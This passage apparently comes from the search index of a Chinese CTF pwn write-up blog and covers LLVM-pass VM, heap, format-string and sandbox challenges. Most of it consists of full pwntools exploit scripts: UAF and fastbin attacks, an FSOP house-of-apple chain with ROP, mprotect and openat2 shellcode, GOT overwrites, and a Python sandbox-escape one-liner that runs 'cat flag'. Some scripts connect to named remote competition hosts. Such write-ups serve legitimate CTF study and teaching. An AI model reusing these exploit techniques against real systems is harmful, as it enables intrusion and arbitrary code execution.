          v8 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 2LL);
          if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v8) &amp;amp; 1) != 0 )
          {
            `anonymous namespace&#39;::c0oo0o0Ode::op3(this, &amp;amp;v15);
          }
          else
          {
            v9 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 3LL);
            if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v9) &amp;amp; 1) != 0 )
            {
              `anonymous namespace&#39;::c0oo0o0Ode::op4(this, &amp;amp;v15);
            }
            else
            {
              v10 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 4LL);
              if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v10) &amp;amp; 1) != 0 )
              {
                `anonymous namespace&#39;::c0oo0o0Ode::op5(this, &amp;amp;v15);
              }
              else
              {
                v11 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 5LL);
                if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v11) &amp;amp; 1) != 0 )
                {
                  `anonymous namespace&#39;::c0oo0o0Ode::op6(this, &amp;amp;v15);
                }
                else
                {
                  v12 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 6LL);
                  if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v12) &amp;amp; 1) != 0 )
                  {
                    `anonymous namespace&#39;::c0oo0o0Ode::op7(this, &amp;amp;v15);
                  }
                  else
                  {
                    v13 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 7LL);
                    if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v13) &amp;amp; 1) != 0 )
                      `anonymous namespace&#39;::c0oo0o0Ode::op8(this, &amp;amp;v15);
                  }
                }
              }
            }
          }
        }
      }
      llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::Instruction,false,false,void&amp;gt;,false,true&amp;gt;::operator++(&amp;amp;v15);
    }
    llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::BasicBlock,false,false,void&amp;gt;,false,true&amp;gt;::operator++(v17);
  }
  return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看出是op1-8的指令，前面使用了&lt;code&gt;isValidOp&lt;/code&gt;函数来判断&lt;br&gt;
进入后发现该函数内部也是通过&lt;code&gt;getName&lt;/code&gt;读取函数名&lt;code&gt;operator==&lt;/code&gt;比较函数名来实现的，所以可以用相同方法找出op1-8所用到的函数名&lt;br&gt;
这里以op1为例&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733844522717.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现需要被修饰为&lt;code&gt;_ZN4edoc4addiEhii&lt;/code&gt;(具体解释见C++函数名修饰规则)，可以推断出该函数是位于edoc类下的addi函数，参数类型是unsigned char、int、int，替他op同理得到交互代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class edoc {
public:
    void addi(unsigned char x, int y, int z) {}  
    void chgr(unsigned char x, int y) {}                  
    void sftr(unsigned char x, bool y, unsigned char z) {}       
    void borr(unsigned char x, unsigned char y, unsigned char z) {} 
    void movr(unsigned char x, unsigned char y) {}                 
    void save(unsigned char x, unsigned int  y) {}              
    void load(unsigned char x, unsigned int y) {}              
    void runc(unsigned char x, unsigned int  y) {}                
};

edoc obj;

int c0deVmMain() {
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;逆向各个opcode&#34;&gt;逆向各个opcode&lt;/h1&gt;
&lt;p&gt;以op1为例&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733844761080.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;code&gt;llvm::CallBase::getNumArgOperands(v13)&lt;/code&gt;用于获取参数个数&lt;br&gt;
&lt;code&gt;ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v13, i);&lt;/code&gt;类似创建参数对象&lt;br&gt;
&lt;code&gt;llvm::ConstantInt::getZExtValue(v8);&lt;/code&gt;获取参数的值&lt;br&gt;
&lt;code&gt;*(_QWORD *)std::vector&amp;lt;unsigned long&amp;gt;::operator[](&amp;amp;secret::regs, ZExtValue) = v6;&lt;/code&gt;相当于regs[ZExtValue]=v6&lt;/p&gt;
&lt;h2 id=&#34;参数位置&#34;&gt;参数位置&lt;/h2&gt;
&lt;p&gt;主要关注&lt;code&gt;getZExtValue&lt;/code&gt;和&lt;code&gt;getBoolValue&lt;/code&gt;之类获取参数的函数&lt;br&gt;
还原各个op功能如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class edoc {
    public:
        void addi(unsigned char reg, int op1, int op2);
        // op1 + op2 -&amp;gt; regs[reg]
        void chgr(unsigned char reg, int op);
        // regs[reg] + op -&amp;gt; regs[reg] if |op| &amp;lt; 0x1000 and only once
        void sftr(unsigned char reg, bool is_left, unsigned char bits);
        // regs[reg] &amp;lt;&amp;lt; bits if is_left else regs[reg] &amp;gt;&amp;gt; bits
        void borr(unsigned char reg1, unsigned char reg2, unsigned char reg3);
        // regs[reg2] | regs[reg3] -&amp;gt; regs[reg1]
        void movr(unsigned char reg1, unsigned char reg2);
        // regs[reg2] -&amp;gt; regs[reg1]
        void save(unsigned char reg, unsigned offset);
        // regs[reg] -&amp;gt; *(regs[6] + offset)
        void load(unsigned char reg, unsigned offset);
        // *(regs[6] + offset) -&amp;gt; regs[reg]
        void runc(unsigned char reg, unsigned offset);
        // *(regs[6] + offset)(regs[reg])
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class edoc {
    public:
        void addi(unsigned char reg, int op1, int op2);
        // op1 + op2 -&amp;gt; regs[reg]
        void chgr(unsigned char reg, int op);
        // regs[reg] + op -&amp;gt; regs[reg] if |op| &amp;lt; 0x1000 and only once
        void sftr(unsigned char reg, bool is_left, unsigned char bits);
        // regs[reg] &amp;lt;&amp;lt; bits if is_left else regs[reg] &amp;gt;&amp;gt; bits
        void borr(unsigned char reg1, unsigned char reg2, unsigned char reg3);
        // regs[reg2] | regs[reg3] -&amp;gt; regs[reg1]
        void movr(unsigned char reg1, unsigned char reg2);
        // regs[reg2] -&amp;gt; regs[reg1]
        void save(unsigned char reg, unsigned offset);
        // regs[reg] -&amp;gt; *(regs[6] + offset)
        void load(unsigned char reg, unsigned offset);
        // *(regs[6] + offset) -&amp;gt; regs[reg]
        void runc(unsigned char reg, unsigned offset);
        // *(regs[6] + offset)(regs[reg])
 };

edoc obj;

void testfunction(){}

int c0deVmMain() {
        obj.addi(0, 0x442000, 0);
        obj.movr(6, 0);
        obj.addi(1, 0x443000, 0);		
        obj.movr(7, 1);					//regs[7] = regs[6] + 0x1000
        obj.load(2, 0xad8);    			//load(0x4420xad8): regs[2] = getenv_addr

        obj.sftr(2, 0, 16);                     
        obj.sftr(2, 1, 12);
        obj.addi(5, 0x400, 0);
        obj.borr(2, 2, 5);
        obj.chgr(2, 0xc00);
        obj.sftr(2, 1, 4);				//Sets the lower two bytes to null and increments the third last byte by 1
        obj.addi(4, 0xd70, 0);
        obj.borr(2, 2, 4);				//clear and add
    
        obj.addi(4, 0x3024, 0);
        obj.save(4, 0x1000);			//save $0

        obj.save(2, 0xb00);				//save system

        obj.runc(1, 0xb00);				//system(&#39;$0&#39;)
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;爆破脚本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import base64

context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)

li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + str(x) + &#39;\x1b[0m&#39;)
ll = lambda x : print(&#39;\x1b[01;38;5;1m&#39; + str(x) + &#39;\x1b[0m&#39;)

context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

with open(&amp;quot;exp.ll&amp;quot;, &amp;quot;rb&amp;quot;) as file:
    p = base64.b64encode(file.read())
p += b&#39;\nEOF\n&#39;

rnd = 0
while True:
    try:
        r = remote(&#39;127.0.0.1&#39;, 7090)
        rnd += 1
        li(&#39;the &#39; + str(rnd) + &#39; round&#39;)
        r.recvuntil(b&#39;(EOF to stop):\n&#39;)

        r.send(p)

        r.sendline(&#39;cat flag&#39;)
        for i in range(4):
            s = r.recvline()
        if b&#39;flag&#39; in s:
            li(s)
            break
        else:
            continue

    except EOFError:
        r.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
">LLVM-pwn</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ji-yu-xinetd-de-pwn-ti-mu-bu-shu/"" data-c="
          &lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Myon5/article/details/131763593&#34;&gt;https://blog.csdn.net/Myon5/article/details/131763593&lt;/a&gt;&lt;br&gt;
1.修改ctf.xinetd和Dockerfile的port为80&lt;br&gt;
2.搭建镜像&lt;code&gt;docker build -t &amp;quot;镜像名&amp;quot; .&lt;/code&gt;&lt;br&gt;
3.运行镜像&lt;code&gt;docker run -d -p &amp;quot;0.0.0.0:8090:80&amp;quot; -h &amp;quot;镜像名&amp;quot; --name=&amp;quot;镜像名&amp;quot; 镜像名&lt;/code&gt;&lt;br&gt;
4.直接&lt;code&gt;nc 127.0.0.1 8090&lt;/code&gt;即可连接成功&lt;br&gt;
&lt;code&gt;docker cp flag 容器ID:/home/ctf&lt;/code&gt;可替换flag&lt;/p&gt;
">基于xinetd的pwn题目部署</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/shu-dao-shan/"" data-c="
          &lt;h1 id=&#34;第一道&#34;&gt;第一道&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1731925415445.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现只要知道libc地址然后再预测一下伪随机数即可拿到sell，question_list在bss段上，数组下表溢出即可改写stdout结构体，泄露出来libc地址，然后再随便预测一下伪随机数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
import ctypes
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
# 加载动态链接库
lib = ctypes.CDLL(&#39;./1.so&#39;)
lib.random_number.restype = ctypes.c_int
# 调用C语言的set_seed函数
lib.set_seed()
# 调用C语言的random_number函数
result = lib.random_number()
rand = result % 9011
print(rand)

#p = process(&amp;quot;./pwn&amp;quot;)
p = remote(&#39;gamebox.yunyansec.com&#39;,25683)

p.sendlineafter(&amp;quot;Which question do you want to answer?\n&amp;quot;,b&#39;-8&#39;)

payload = p64(0xfbad1800) + p64(0)*3 + b&#39;\x00&#39;
p.sendlineafter(&amp;quot;Then you can input your answer.&amp;quot;,payload)
p.recv(1)
p.recv(8)
libc = u64(p.recv(8)) - 2017664
print(&amp;quot;libc = &amp;quot;,hex(libc))
puts = libc + 0x000000000084420
pause()
p.sendlineafter(&amp;quot;Which question do you want to answer?&amp;quot;,b&#39;2&#39;)
p.sendlineafter(&amp;quot;Then you can input your answer.&amp;quot;,b&#39;2&#39;)
p.sendlineafter(&amp;quot;Which question do you want to answer?&amp;quot;,b&#39;3&#39;)
p.sendlineafter(&amp;quot;Then you can input your answer.&amp;quot;,p64(puts + rand))
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;第二道noleak&#34;&gt;第二道(noleak??)&lt;/h1&gt;
&lt;p&gt;2.23的libc,给了后门函数，程序开头给了堆地址，只有add和delete功能但是基本没有限制，存在uaf，版本很低，直接打fast attack即可，但是没有show功能，所以需要劫持stdout结构体，要让libc的地址出现在fast bin中，具体做法是先创建一个大的unsorted bin，然后通过uaf实现堆覆盖，大概布置成这个样子&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1731926053038.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
然后分配unsortedbin就可以，再修改低位覆盖即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./vuln&#39;)
e = ELF(&#39;./vuln&#39;)
libc = ELF(&#39;./libc.so.6&#39;)  # ubuntu22打本地

one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b&#39;&amp;gt;&amp;gt;&amp;gt; &#39;)
    r.sendline(str(choice).encode())


def add(idx,size,content):
    cmd(1)
    r.recvuntil(b&#39;idx???&#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;size???&#39;)
    r.sendline(str(size).encode())
    r.recvuntil(b&#39;content???&#39;)
    r.send(content)


def delete(idx):
    cmd(2)
    r.recvuntil(b&#39;idx???&#39;)
    r.sendline(str(idx).encode())

r.recvuntil(&amp;quot;0x&amp;quot;)
heap = int(r.recv(7),16)
print(&amp;quot;heap = &amp;quot;,hex(heap))
add(0,0x500,b&#39;a&#39;)
add(1,0x20,b&#39;a&#39;)
delete(0)
add(2,0x48,b&#39;\x78&#39;)
add(3,0x48,(p64(0) + p64(0x51))*4)
add(4,0x78,b&#39;\x78&#39;)
add(5,0x68,b&#39;\x78&#39;)
add(10,0x48,b&#39;\x78&#39;)
delete(2)
delete(3)
delete(2)
fake_heap = heap - 134992
add(6,0x48,p64(fake_heap))
add(7,0x48,b&#39;a&#39;)
add(8,0x48,b&#39;a&#39;)
add(9,0x48,p64(0) + p64(0xf1))
delete(4)
delete(5)
add(11,0x78,(p64(0) + p64(0x41))*7)
add(12,0x58,b&#39;a&#39;)

add(4,0x38,b&#39;\x78&#39;)
add(5,0x38,b&#39;\x78&#39;)
add(10,0x38,b&#39;\x78&#39;)
delete(4)
delete(5)
delete(4)
fake_heap = heap - 134864
add(6,0x38,p64(fake_heap))
add(99,0x38,b&#39;a&#39;)
add(99,0x38,b&#39;a&#39;)
add(9,0x38,p64(0) + p64(0x71) + b&#39;\xdd\x55&#39;)
add(9,0x38,p64(0) + p64(0x71) + b&#39;\xdd\x55&#39;)
add(5,0x68,b&#39;\x78&#39;)
add(12,0x68,b&#39;\x00&#39;*51 + p64(0xfbad1800) + p64(0)*3 + b&#39;\x40&#39;)
libc = u64(r.recv(8)) - 3954240
print(&amp;quot;libc = &amp;quot;,hex(libc))
malloc_hook = libc + 3951376

add(4,0x68,b&#39;\x78&#39;)
add(5,0x68,b&#39;\x78&#39;)
add(10,0x68,b&#39;\x78&#39;)
delete(4)
delete(5)
delete(4)
add(6,0x68,p64(malloc_hook - 35))
add(99,0x68,b&#39;a&#39;)
add(99,0x68,b&#39;a&#39;)
#gdb.attach(r)
backdoor = 0x000000000400AAA
add(9,0x68,b&#39;a&#39;*19 + p64(backdoor))
cmd(1)
r.recvuntil(b&#39;idx???&#39;)
r.sendline(str(0).encode())
r.recvuntil(b&#39;size???&#39;)
r.sendline(str(0x100).encode())
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
">蜀道山</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/qiang-wang-bei/"" data-c="
          &lt;h1 id=&#34;baby_heap&#34;&gt;baby_heap&lt;/h1&gt;
&lt;p&gt;程序是2.35的libc，增删改查功能都有，但是只能edit一次&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730625989781.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
只能show一次&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730626006840.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
只能add6个堆块，大小在0x500以上，下标从1开始，&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730625869786.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
有UAF，free后也能edit和show&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730625970233.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
第五个选项没啥用&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730627002423.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
程序还给了一个类似于后门的选项&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730625650896.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
但是有个检查&lt;img src=&#34;https://l1u66.github.io//post-images/1730625694248.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
动调看了下范围，发现能写的地址范围没啥有用的&lt;br&gt;
还开了沙盒&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1730626306949.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;攻击思路&#34;&gt;攻击思路&lt;/h2&gt;
&lt;p&gt;2.35的libc没有了各种hook，所以需要打io，程序易通过exit函数退出，易触发FSOP，首先选择打house of apple，有edit就可以打largebin attack了，需要add5个堆块，中间可以show一个largebin里的堆块泄露出libc和heap地址，劫持_IO_list_all，但是此时_IO_list_all里的伪造的io是第二次进入largebin的堆块，而只有一次edit机会已经用在了largebin attack上，此时还有一次add的机会，把此堆块申请出来就可以使_IO_list_all里的伪造的io指向第一次进入largebin的堆块，就可以被我们控制，伪造io时发现_IO_wfile_jumps被置0了，所以用_IO_wfile_jumps_mmap来调用_IO_wfile_overflow，程序开了沙盒，禁用了open和openat，使用openat2绕过即可，不能直接拿到shell，所以伪造io使用svcudp_reply的gadgets调用mprotect使堆地址可执行，写入shellcode执行即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *

context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
# io = process(&#39;./pwn&#39;)
io = remote(&amp;quot;59.110.159.153&amp;quot;,35015)
e = ELF(&#39;./pwn&#39;)
lib = e.libc

def dbg():
    gdb.attach(io)


def cmd(choice):
    io.sendlineafter(&#39;Enter your choice: \n&#39;,str(choice).encode())

# 大小在0x500以上
# 6个 从1开始
def add(size):
    cmd(1)
    io.sendlineafter(&#39;Enter your commodity size \n&#39;,str(size).encode())

def edit(idx,payload):
    cmd(3)
    io.sendlineafter(&#39;Enter which to edit: \n&#39;,str(idx).encode())
    io.sendlineafter(&#39;Input the content \n&#39;,payload)

def delete(idx):
    cmd(2)
    io.sendlineafter(&#39;Enter which to delete: \n&#39;,str(idx).encode())
    
def show(idx):
    cmd(4)
    io.sendlineafter(&#39;Enter which to show: \n&#39;,str(idx).encode())

# 任意地址写
def magic(addr,con):
    cmd(6)
    io.sendlineafter(&#39;Input your target addr \n&#39;,p64(addr))
    io.send(p64(con))


add(0x528)#1
add(0x528)#2
add(0x518)#3
delete(1)
add(0x620)#4
show(1)

io.recvuntil(&amp;quot;The content is here \n&amp;quot;)
libc = u64(io.recv(8)) 
libc_base = libc - 0x21b110
print(&amp;quot;libc_base = &amp;quot;,hex(libc_base))
io.recv(8)
heap = u64(io.recv(8)) 
heap_base = heap - 0x950
print(&amp;quot;heap_base = &amp;quot;,hex(heap_base))

strerr = 0x21b860 + libc_base
fake_io_addr = 2384 + heap_base
lock = libc_base + 0x21ba60
_IO_list_all = libc_base + lib.sym[&#39;_IO_list_all&#39;]
io_wfile_jumps = libc_base + lib.sym[&#39;_IO_wfile_jumps&#39;] - 0xc0
magic_gadget = libc_base + 0x000000000016a06a
add_rsp_ret=libc_base+0x000000000003a889        #0x18
leave_ret = libc_base + 0x000000000004da83
&amp;quot;&amp;quot;&amp;quot;
&amp;lt;svcudp_reply+26&amp;gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:    mov    rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:    lea    r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:    mov    DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:    mov    rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:    call   QWORD PTR [rax+0x28]
&amp;quot;&amp;quot;&amp;quot;
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_r12 = libc_base + 0x000000000011f2e7
mprotect = libc_base + 0x00000000011EAA0
# openat2 
sh=f&#39;&#39;&#39;
mov rax, 0x67616c66 /*  /flag   */
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
push 0
push 0
push 0
mov rdx, rsp
mov r10, 0x18
push 437
pop rax
syscall

mov rdi,rax
mov rsi,rsp
push 0x100
pop rdx
xor eax,eax
syscall

xor rdi,rdi
inc rdi
mov rax,rdi
syscall
&#39;&#39;&#39;

rop=p64(pop_rdi)
rop+=p64(heap - 0x950)
rop+=p64(pop_rsi)
rop+=p64(0x1000)
rop+=p64(pop_rdx_r12)
rop+=p64(7)
rop+=p64(0)
rop+=p64(mprotect)
rop+=p64(fake_io_addr + 0x370)

fake_io_file = p64(0)*2 + p64(1) + p64(_IO_list_all - 0x20)
fake_io_file = fake_io_file.ljust(
    0x48 - 0x10, b&#39;\0&#39;) + p64(fake_io_addr + 0x300) + p64(leave_ret)  # rbp
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b&#39;\0&#39;) + p64(fake_io_addr + 0x100)  # _wide_data (A)
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(fake_io_addr + 0x200)  # B
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b&#39;\0&#39;) + p64(0)*13 + p64(magic_gadget)  # C
fake_io_file = fake_io_file.ljust(
    0x300 - 0x10, b&#39;\0&#39;) + p64(0) + p64(add_rsp_ret)
fake_io_file = fake_io_file.ljust(
    0x318 - 0x10, b&#39;\0&#39;) + p64(fake_io_addr + 0x28) + p64(0) + rop  # rax
fake_io_file += asm(sh)

edit(1,fake_io_file)
delete(3)
add(0x620)#5
add(0x518)#6
print(&amp;quot;_IO_list_all = &amp;quot;,hex(_IO_list_all))
print(&amp;quot;fake_io_addr = &amp;quot;,hex(fake_io_addr))
print(sh)
# gdb.attach(io)
cmd(4)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">强网杯</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/yuan-lu-bei-2024/"" data-c="
          &lt;p&gt;浅浅拿个二等奖😋&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1729873236149.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;round-1&#34;&gt;Round 1&lt;/h1&gt;
&lt;h2 id=&#34;round-1-canary_orw&#34;&gt;[Round 1] canary_orw&lt;/h2&gt;
&lt;p&gt;ida打开程序发现有个hint函数，里面有个汇编jmp rsp，并且发现栈可执行，所以得知打shellcode，并且开了沙盒，没有任何过滤&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

p = process(&#39;./canary&#39;)
elf = ELF(&#39;./canary&#39;)

vuln = 0x000000000400820
jmp_rsp = 0x00000000040081B
# xor eax,eax 
# add rdx,0x60
# syscall
payload = p64(jmp_rsp) + b&amp;quot;\x31\xc0\x31\xff\x48\x83\xc2\x60\x0f\x05&amp;quot;
# gdb.attach(p)
p.sendafter(&amp;quot;Say some old spells to start the journey\n&amp;quot;, payload)
shellcode=&#39;&#39;&#39;
	xor rax, rax   #xor rax,rax是对rax的清零运算操作
	xor rdi, rdi   #清空rdi寄存器的值
	xor rsi, rsi   #清空rsi寄存器的值
	xor rdx, rdx
	mov rax, 2      #open调用号为2
	mov rdi, 0x67616c662f2e   #为galf/.为./flag的相反0x67616c662f2e为/flag的ASCII码的十六进制
	push rdi
	mov rdi, rsp
    xor rsi, rsi
	syscall   #系统调用前，linux在eax寄存器里写入子功能号，断止处理程序根据eax寄存器的值来判断用户进程申请哪	类系统调用。
	mov rdx, 0x100   #sys_read(3,file,0x100)
	mov rsi, rdi
	mov rdi, rax
	mov rax, 0      #read调用号为0,0为文件描述符，即外部输入，例如键盘
	syscall
	mov rdi, 1      #sys_write(1,file,0x30)
	mov rax, 1      #write调用号为1,1为文件描述符，指的是屏幕
	syscall
&#39;&#39;&#39;
shellcode = asm(shellcode)
print(shellcode)
pause()
p.send(b&#39;./flag\x00\x00&#39; + shellcode)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-ezfmt&#34;&gt;[Round 1] ezfmt&lt;/h2&gt;
&lt;p&gt;一次栈溢出外加一次格式化字符串，通过栈溢出可以触发多次格式化字符串,本来想改printf的got表，但是read的字节数貌似不太够，想到有one_gadgets，第二个即可拿到shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./pwn&amp;quot;)
elf = ELF(&amp;quot;./pwn&amp;quot;)

bss = 0x000000000404060 + 0x700
main = 0x00000000040120D
printf = 0x000000000404020

# gdb.attach(p)
payload = b&amp;quot;%13$paaa&amp;quot;
payload = payload.ljust(32,b&#39;a&#39;)
payload += p64(bss) + p64(main)
p.sendafter(&amp;quot;welcome to YLCTF\n&amp;quot;,payload)

p.recvuntil(&amp;quot;0x&amp;quot;)
__libc_start_main = int(p.recv(12),16) - 243
print(&amp;quot;__libc_start_main = &amp;quot;,hex(__libc_start_main))
base = __libc_start_main - 147344
print(&amp;quot;base = &amp;quot;,hex(base))
sys = base + 0x000000000052290
print(&amp;quot;sys = &amp;quot;,hex(sys))
one = [0xe3afe, 0xe3b01, 0xe3b04]

x1 = sys &amp;amp; 0xffff
payload = b&#39;%&#39; + str(x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%7$hn&#39;
x2 = (sys &amp;gt;&amp;gt; 8) &amp;amp; 0xff
payload += b&#39;%&#39; + str(0x100 + x2 - x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%8$hhn&#39;
payload = payload.ljust(0x20,b&#39;\x00&#39;)
payload += p64(printf) + p64(printf + 4)
pause()
p.sendline(b&#39;a&#39;*32 + p64(0) + p64(base + one[1]))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;round-1-ezheap&#34;&gt;[Round 1] ezheap&lt;/h2&gt;
&lt;h3 id=&#34;非预期&#34;&gt;非预期&lt;/h3&gt;
&lt;p&gt;这题也是抽象，用网站去接受脚本本地运行出结果，还写明了&amp;lt;请勿带有os和subprocess&amp;gt;，经过print(1)测试后发现直接回显，就想到python沙箱逃逸，拷打gpt得到&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1729872506628.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试后不行，觉得应该是吧os字符过滤掉了，直接空字符绕过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sys = __import__(&#39;o&#39;&#39;s&#39;)
sys.system(&#39;cat flag&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;直接拿到flag了......&lt;/p&gt;
&lt;h3 id=&#34;预期解&#34;&gt;预期解&lt;/h3&gt;
&lt;p&gt;该程序有一次任意地址写一大数的机会，可以覆盖mp扩大tcachebin的范围，这个指针会会按照地址顺延到高地址处的chunk，会被我们控制，从而让我们拥有任意地址写的能力，从而获取shell。&lt;/p&gt;
&lt;h4 id=&#34;寻找mp_&#34;&gt;寻找mp_&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;p mp_&lt;/code&gt;打印出mp_结构体，覆盖偏移0x50的tcache_bins即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
from pwn import*
from ctypes import *
from struct import *

io = process(&amp;quot;./pwn&amp;quot;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)

libc = ELF(&amp;quot;./libc-2.31.so&amp;quot;)

elf = ELF(&amp;quot;./pwn&amp;quot;)
menu=&amp;quot;Input your choice&amp;quot;
def add(size,cont):
    io.sendlineafter(menu,str(1))
    io.sendlineafter(&amp;quot;Size :&amp;quot;,str(size))
    io.sendafter(&amp;quot;Content :&amp;quot;,cont)

def delete(idx):
